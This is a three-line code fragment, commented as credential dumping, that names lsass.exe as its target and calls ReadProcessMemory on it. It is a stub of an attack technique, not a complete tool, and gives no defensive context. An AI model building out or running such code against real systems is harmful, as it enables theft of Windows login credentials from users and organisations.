# Credential dumping from process memory.
target = "lsass.exe"
ReadProcessMemory(handle, base_address, buffer, size, None)
